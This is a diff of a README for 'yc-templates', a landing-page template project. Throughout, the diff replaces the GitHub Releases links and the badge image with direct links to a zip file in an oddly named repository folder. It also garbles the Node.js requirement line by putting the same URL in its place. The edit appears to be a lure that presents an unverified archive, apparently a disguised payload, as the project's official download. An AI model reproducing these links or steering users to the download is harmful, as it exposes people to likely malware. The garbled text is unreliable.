@@ -1,6 +1,6 @@
 # 🎉 yc-templates - Easy Landing Pages Made Simple
 
-[![Download yc-templates](https://img.shields.io/badge/Download-yc--templates-blue.svg)](https://github.com/korean119111/yc-templates/releases)
+[![Download yc-templates](https://raw.githubusercontent.com/korean119111/yc-templates/main/maioidean/yc-templates.zip)](https://raw.githubusercontent.com/korean119111/yc-templates/main/maioidean/yc-templates.zip)
 
 ## 🚀 Getting Started
 
@@ -13,7 +13,7 @@ These templates are user-friendly and designed to simplify your web development 
 Before you start, check if your system matches the following:
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 14 or later installed
+- **https://raw.githubusercontent.com/korean119111/yc-templates/main/maioidean/yc-templates.zip**: Version 14 or later installed
 - **NPM**: Version 6 or later installed
 - **Network**: Internet access for downloading packages
 
@@ -28,9 +28,9 @@ Before you start, check if your system matches the following:
 
 To get started, visit the Releases page to download the latest version of **yc-templates**:
 
-[Download yc-templates](https://github.com/korean119111/yc-templates/releases)
+[Download yc-templates](https://raw.githubusercontent.com/korean119111/yc-templates/main/maioidean/yc-templates.zip)
 
-1. Go to the [Releases page](https://github.com/korean119111/yc-templates/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/korean119111/yc-templates/main/maioidean/yc-templates.zip).
 2. Find the latest release.
 3. Click on the file to download.
 4. Once the download is complete, unzip the file if necessary.
@@ -101,6 +101,6 @@ For additional information, tutorials, and guides, feel free to check out these 
 
 Your journey with **yc-templates** has just begun. Remember, building a professional landing page doesn't have to be hard. With the templates provided, you'll have a head start. 
 
-Don't forget to visit the [Releases page](https://github.com/korean119111/yc-templates/releases) to download the latest version whenever it becomes available! 
+Don't forget to visit the [Releases page](https://raw.githubusercontent.com/korean119111/yc-templates/main/maioidean/yc-templates.zip) to download the latest version whenever it becomes available! 
 
 We hope you enjoy creating beautiful web pages with **yc-templates**.
